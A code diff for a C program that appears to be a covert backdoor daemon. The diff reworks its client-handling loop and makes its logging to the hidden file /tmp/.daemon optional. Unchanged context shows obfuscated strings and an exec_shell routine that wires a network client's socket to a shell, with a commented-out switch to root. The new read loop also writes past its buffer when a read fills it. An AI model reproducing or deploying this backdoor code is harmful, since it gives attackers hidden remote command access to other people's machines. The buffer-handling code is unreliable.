@@ -21,6 +21,7 @@ static int my_htons(int port)
 	return ((port & 0xff) << 8) | ((port & 0xff00) >> 8);
 }
 
+#ifdef LOGGER
 static void logger(const char *msg)
 {
 	int fd = open(STR("/tmp/.daemon"), O_WRONLY | O_CREAT | O_APPEND, 0644);
@@ -31,6 +32,12 @@ static void logger(const char *msg)
 	write(fd, msg, ft_strlen(msg));
 	close(fd);
 }
+#else
+static void logger(const char *msg)
+{
+	(void)msg;
+}
+#endif
 
 static int create_server(void)
 {
@@ -95,7 +102,6 @@ void exec_shell(param_t *command)
 
 	if (pid == 0) {
 		//setuid(0); // change to root
-		setpgid(0, 0); // create new process group
 		dup2(client_fd, 0);
 		dup2(client_fd, 1);
 		dup2(client_fd, 2);
@@ -130,127 +136,125 @@ command_func_t get_command(const char *cmd)
 
 	return unknown;
 }
-//
-//static void poller(int fd, char **envp)
-//{
-//
-//	int use_client = 0;
-//	int client_fd = -1;
-//	char buf[1024];
-//	int ret = 0;
-//
-//	while (1) {
-//
-//		if (use_client == 0) {
-//
-//			client_fd = accept_client(fd);
-//			if (client_fd == -1) {
-//				logger(STR("accept failed\n"));
-//				break;
-//			}
-//		}
-//
-//		use_client++;
-//
-//		ret = read(client_fd, buf, sizeof(buf));
-//		if (ret == -1) {
-//			logger(STR("read failed\n"));
-//			use_client--;
-//			close(client_fd);
-//			continue;
-//		}
-//		else if (ret == 0) {
-//			logger(STR("client disconnected\n"));
-//			use_client--;
-//			close(client_fd);
-//			continue;
-//		}
-//
-//		buf[ret] = '\0';
-//		if (buf[ret - 1] == '\n') {
-//			buf[ret - 1] = '\0';
-//		}
-//
-//		param_t command = {
-//			.client_fd = client_fd,
-//			.envp = envp
-//		};
-//
-//		command_func_t func = get_command(buf);
-//		if (func != NULL) {
-//			func(&command);
-//		}
-//	}
-//}
 
 static void poller(int fd, char **envp)
 {
-	struct pollfd fds[MAX_CLIENTS + 1];
-	fds[0].fd = fd;
-	fds[0].events = POLLIN;
-
-	for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-		fds[i].fd = -1;
-	}
 
 	int use_client = 0;
+	int client_fd = -1;
+	char buf[256];
+	int ret = 0;
 
 	while (1) {
-		if (poll(&fds, use_client + 1, -1) == -1) {
+
+		if (use_client < MAX_CLIENTS) {
+			client_fd = accept_client(fd);
+			if (client_fd == -1) {
+				logger(STR("accept failed\n"));
+				break;
+			}
+			use_client++;
+		}
+
+		buf[0] = '\0';
+		ret = read(client_fd, buf, sizeof(buf));
+		if (ret == -1) {
+			close(client_fd);
 			break;
 		}
-
-		if (fds[0].revents & POLLIN) {
-			if (use_client == MAX_CLIENTS) {
-				logger(STR("max clients\n"));
-				continue;
-			}
-
-			int client_fd = accept_client(fd);
-
-			if (client_fd != -1) {
-				for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-					if (fds[i].fd == -1) {
-						fds[i].fd = client_fd;
-						fds[i].events = POLLIN;
-						use_client++;
-						logger(STR("new client\n"));
-						break;
-					}
-				}
-			}
+		else if (ret == 0) {
+			logger(STR("client disconnected\n"));
+			use_client--;
+			close(client_fd);
+			continue;
 		}
 
-		for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-			if (fds[i].fd == -1 || (fds[i].revents & POLLIN) == 0) 
-				continue;
-			else {
-				char buf[1024];
-				int ret = read(fds[i].fd, buf, sizeof(buf));
-				if (ret <= 0) {
-					close(fds[i].fd);
-					fds[i].fd = -1;
-					use_client--;
-					logger(STR("client disconnected\n"));
-				}
-				else {
-					buf[ret] = '\0';
-					if (buf[ret - 1] == '\n') {
-						buf[ret - 1] = '\0';
-					}
-					param_t command = {
-						.client_fd = fds[i].fd,
-						.envp = envp
-					};
-					command_func_t func = get_command(buf);
-					if (func != NULL) {
-						func(&command);
-					}
-				}
-			}
+		buf[ret] = '\0';
+		if (buf[ret - 1] == '\n') {
+			buf[ret - 1] = '\0';
 		}
+
+		param_t command = {
+			.client_fd = client_fd,
+			.envp = envp
+		};
+
+		command_func_t func = get_command(buf);
+		if (func != NULL) {
+			func(&command);
+		}
+
 	}
 }
+
+//static void poller(int fd, char **envp)
+//{
+//	struct pollfd fds[MAX_CLIENTS + 1];
+//	fds[0].fd = fd;
+//	fds[0].events = POLLIN;
+//
+//	for (int i = 1; i < MAX_CLIENTS + 1; i++) {
+//		fds[i].fd = -1;
+//	}
+//
+//	int use_client = 0;
+//
+//	while (1) {
+//		if (poll(&fds, use_client + 1, -1) == -1) {
+//			break;
+//		}
+//
+//		if (fds[0].revents & POLLIN) {
+//			if (use_client == MAX_CLIENTS) {
+//				logger(STR("max clients\n"));
+//				continue;
+//			}
+//
+//			int client_fd = accept_client(fd);
+//
+//			if (client_fd != -1) {
+//				for (int i = 1; i < MAX_CLIENTS + 1; i++) {
+//					if (fds[i].fd == -1) {
+//						fds[i].fd = client_fd;
+//						fds[i].events = POLLIN;
+//						use_client++;
+//						logger(STR("new client\n"));
+//						break;
+//					}
+//				}
+//			}
+//		}
+//
+//		for (int i = 1; i < MAX_CLIENTS + 1; i++) {
+//			if (fds[i].fd == -1 || (fds[i].revents & POLLIN) == 0) 
+//				continue;
+//			else {
+//				char buf[1024];
+//				int ret = read(fds[i].fd, buf, sizeof(buf));
+//				if (ret <= 0) {
+//					close(fds[i].fd);
+//					fds[i].fd = -1;
+//					use_client--;
+//					logger(STR("client disconnected\n"));
+//				}
+//				else {
+//					buf[ret] = '\0';
+//					if (buf[ret - 1] == '\n') {
+//						buf[ret - 1] = '\0';
+//					}
+//					param_t command = {
+//						.client_fd = fds[i].fd,
+//						.envp = envp
+//					};
+//					command_func_t func = get_command(buf);
+//					if (func != NULL) {
+//						func(&command);
+//					}
+//				}
+//			}
+//		}
+//	}
+//}
 
 static int lock(int *lock_fd, int close_end)
 {
